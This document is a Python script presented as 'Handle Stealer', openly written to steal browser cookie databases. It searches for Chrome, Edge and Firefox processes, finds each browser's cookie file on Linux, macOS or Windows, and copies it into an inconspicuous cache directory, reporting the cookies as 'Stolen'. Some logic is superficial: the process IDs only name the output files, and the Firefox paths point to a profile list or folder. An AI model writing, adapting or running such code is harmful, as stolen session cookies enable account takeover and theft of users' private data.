#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Handle Stealer - ARM64 Version
Converted from handle-stealer.c for ARM64 architecture

This module steals browser cookie databases by accessing browser processes on ARM64 systems.
"""

import os
import sys
import psutil
import platform
import shutil
from pathlib import Path
import subprocess

class HandleStealerARM64:
    """Steal browser cookie databases on ARM64 systems"""
    
    def __init__(self):
        self.system = platform.system().lower()
        self.arch = platform.machine().lower()
        
    def is_network_service(self, pid):
        """Check if process is NetworkService or equivalent"""
        try:
            process = psutil.Process(pid)
            cmdline = ' '.join(process.cmdline())
            
            # Check for network service patterns
            network_patterns = ["NetworkService", "network", "networking"]
            return any(pattern in cmdline.lower() for pattern in network_patterns)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            return False
    
    def get_process_pid_by_name(self, process_name):
        """Get process PID by name"""
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == process_name.lower():
                    yield proc.info['pid']
        except Exception as e:
            print(f"Error getting process PID: {e}")
    
    def get_cookie_db_path_linux(self, browser_name):
        """Get cookie database path for Linux ARM64"""
        home = os.environ.get('HOME')
        if not home:
            return None
        
        if browser_name.lower() == "chrome":
            return os.path.join(home, '.config', 'google-chrome', 'Default', 'Cookies')
        elif browser_name.lower() == "firefox":
            return os.path.join(home, '.mozilla', 'firefox', 'profiles.ini')
        elif browser_name.lower() == "edge":
            return os.path.join(home, '.config', 'microsoft-edge', 'Default', 'Cookies')
        
        return None
    
    def get_cookie_db_path_macos(self, browser_name):
        """Get cookie database path for macOS ARM64"""
        home = os.environ.get('HOME')
        if not home:
            return None
        
        if browser_name.lower() == "chrome":
            return os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'Cookies')
        elif browser_name.lower() == "firefox":
            return os.path.join(home, 'Library', 'Application Support', 'Firefox', 'Profiles')
        elif browser_name.lower() == "edge":
            return os.path.join(home, 'Library', 'Application Support', 'Microsoft Edge', 'Default', 'Cookies')
        
        return None
    
    def get_cookie_db_path_windows(self, browser_name):
        """Get cookie database path for Windows ARM64"""
        appdata = os.environ.get('LOCALAPPDATA')
        if not appdata:
            appdata = os.environ.get('APPDATA')
        
        if browser_name.lower() == "chrome":
            return os.path.join(appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
        elif browser_name.lower() == "firefox":
            return os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles')
        elif browser_name.lower() == "edge":
            return os.path.join(appdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
        
        return None
    
    def copy_database_file(self, browser_name, pid):
        """Copy database file for ARM64 systems"""
        try:
            # Get cookie database path based on OS
            if self.system == "linux":
                db_path = self.get_cookie_db_path_linux(browser_name)
            elif self.system == "darwin":
                db_path = self.get_cookie_db_path_macos(browser_name)
            else:
                db_path = self.get_cookie_db_path_windows(browser_name)
            
            if not db_path or not os.path.exists(db_path):
                print(f"Cookie database not found for {browser_name}")
                return False
            
            # Get output directory
            if self.system == "linux":
                output_dir = os.path.join(os.environ.get('HOME', '/tmp'), '.local', 'share')
            elif self.system == "darwin":
                output_dir = os.path.join(os.environ.get('HOME', '/tmp'), 'Library', 'Caches')
            else:
                output_dir = os.environ.get('LOCALAPPDATA', os.environ.get('TEMP', '/tmp'))
            
            os.makedirs(output_dir, exist_ok=True)
            
            # Copy the database file
            output_path = os.path.join(output_dir, f"{browser_name}_{pid}.db")
            shutil.copy2(db_path, output_path)
            
            print(f"Cookie database copied to: {output_path}")
            return True
            
        except Exception as e:
            print(f"Error copying database: {e}")
            return False
    
    def steal_chrome_cookies(self):
        """Steal Chrome cookies on ARM64"""
        print("Looking for Chrome processes...")
        success = False
        
        for pid in self.get_process_pid_by_name("chrome"):
            if self.copy_database_file("chrome", pid):
                success = True
        
        return success
    
    def steal_edge_cookies(self):
        """Steal Edge cookies on ARM64"""
        print("Looking for Edge processes...")
        success = False
        
        edge_processes = ["msedge", "microsoft-edge", "edge"]
        for process_name in edge_processes:
            for pid in self.get_process_pid_by_name(process_name):
                if self.copy_database_file("edge", pid):
                    success = True
        
        return success
    
    def steal_firefox_cookies(self):
        """Steal Firefox cookies on ARM64"""
        print("Looking for Firefox processes...")
        success = False
        
        firefox_processes = ["firefox", "firefox-bin"]
        for process_name in firefox_processes:
            for pid in self.get_process_pid_by_name(process_name):
                if self.copy_database_file("firefox", pid):
                    success = True
        
        return success
    
    def steal_all_cookies(self):
        """Steal cookies from all supported browsers on ARM64"""
        print("Handle Stealer - Cookie Database Theft (ARM64)")
        print("=" * 50)
        
        chrome_success = self.steal_chrome_cookies()
        edge_success = self.steal_edge_cookies()
        firefox_success = self.steal_firefox_cookies()
        
        print("\nProcess completed.")
        print(f"Chrome cookies: {'Stolen' if chrome_success else 'Not found'}")
        print(f"Edge cookies: {'Stolen' if edge_success else 'Not found'}")
        print(f"Firefox cookies: {'Stolen' if firefox_success else 'Not found'}")
        
        return chrome_success or edge_success or firefox_success

def main():
    """Main function"""
    try:
        stealer = HandleStealerARM64()
        success = stealer.steal_all_cookies()
        
        if success:
            print("\nCookie theft completed successfully!")
        else:
            print("\nNo cookies were stolen.")
            
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()